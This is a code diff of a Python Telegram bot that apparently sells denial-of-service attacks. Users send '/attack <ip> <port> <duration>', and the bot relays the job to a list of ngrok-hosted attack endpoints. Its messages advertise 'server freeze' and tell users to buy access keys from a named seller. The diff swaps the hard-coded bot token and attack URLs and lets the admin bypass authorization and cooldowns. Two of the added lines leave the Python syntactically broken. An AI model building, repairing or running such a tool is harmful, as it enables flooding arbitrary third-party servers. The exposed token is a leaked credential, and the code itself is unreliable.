@@ -23,13 +23,13 @@ async def get_settings():
     return 10, 9  # Default values if not set
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7881686110:AAEh2ZbKfpvyjQT8nSEt28kG3y1a4eEOeVQ'
+TELEGRAM_BOT_TOKEN = '7881686110:AAEumtUEjMQ-Po5dp4jIby_2IU7q3upQZtA'
 ADMIN_USER_ID = 529691217  # Replace with your admin user ID
 # Replace this with your actual list of URLs
 attack_urls = [
-    "https://3859-2406-da1a-1f0-4500-c2fa-6a00-cfd7-f3cc.ngrok-free.app/run_Spike",
-    "https://72fd-2a05-d016-73c-dd00-c99d-92e3-4f2-d36.ngrok-free.app/run_Spike",
-    "https://f27e-2406-da1a-1f0-4500-9f33-bea2-50e9-6c16.ngrok-free.app/run_Spike",
+    "https://aebd-2a05-d016-73c-dd00-c99d-92e3-4f2-d36.ngrok-free.app/run_vampire",
+    "https://82a1-2406-da1a-1f0-4500-c2fa-6a00-cfd7-f3cc.ngrok-free.app/run_vampire",
+    "https://a750-2a05-d016-73c-dd00-9719-2e9b-b693-d09b.ngrok-free.app/run_vampire",
 ]
 # Track user attacks and cooldowns
 cooldown_dict = {}
@@ -44,13 +44,13 @@ async def start(update: Update, context: CallbackContext):
 
     # Check if the user is allowed to use the bot
     if not await is_user_allowed(user_id):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*❌ ❌ 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩! 𝘽𝙪𝙮 𝙩𝙝𝙚 𝙠𝙚𝙮𝙨 𝙛𝙧𝙤𝙢 @Demon_Rocky*", parse_mode='Markdown')
         return
 
     message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-           "*Use /attack <ip> <port>*\n"
-              "*🎭DARKWEB BOT🎭*"
+          "*🚀ıllıllı ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ  ÐɐƦʞωǝß ßÖ† ıllıllı 🚀*\n\n"
+        "*💀Use /attack <ip> <port> <duration>*\n"
+        "*🖥️ ꜱᴇʀᴠᴇʀ ꜰʀᴇᴇᴢ ᴡɪᴛʜ @DEMON_ROCKY 🚀*" 
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -125,7 +125,7 @@ async def attack(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
 
     # Check if the user is allowed to use the bot
-    if not await is_user_allowed(user_id):
+    if not await is_user_allowed(user_id) and user_id != ADMIN_USER_ID:
         await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
         return
 
@@ -141,6 +141,7 @@ async def attack(update: Update, context: CallbackContext):
     threads, byte_size = await get_settings()
 
     # Check for cooldown
+    if user_id != ADMIN_USER_ID:
     if user_id in cooldown_dict and datetime.now(timezone.utc) < cooldown_dict[user_id]:
         remaining_time = (cooldown_dict[user_id] - datetime.now(timezone.utc)).total_seconds()
         await context.bot.send_message(chat_id=chat_id, text=f"*❌ You need to wait {int(remaining_time)} seconds before attacking again.*", parse_mode='Markdown')
@@ -169,15 +170,16 @@ async def attack(update: Update, context: CallbackContext):
     await context.bot.send_message(
         chat_id=chat_id,
         text=(
-            f"*⚔️ Attack Launched! ⚔️*\n"
-            f"*🎯 Target: {ip}:{port}*\n"
-            f"*🕒 Duration: 260 seconds*\n"
-            f"*🔥 Let the battlefield ignite! 💥*"
+            f"*🚀 ÐɐƦʞωǝß ℓαυη¢ђє∂! ⚔️\n"
+            f"*☄️ 丅ɐƦĞə𝚝: {ip}:{port}*\n"
+            f"*🕒 🧵 𐌀丅丅ɐcʞ ∂υяαтιση: 260 seconds*\n"
+            f"*🔥•------» 𐌀ттα¢к ιη ρяσ¢єѕѕ «------•💥*"
         ),
         parse_mode='Markdown'
     )
 
 # Record the attack time for the IP and port combination
+    if user_id != ADMIN_USER_ID:
     user_attack_history[attack_key] = datetime.now(timezone.utc)
 
     # Set a cooldown for the user (60 seconds)
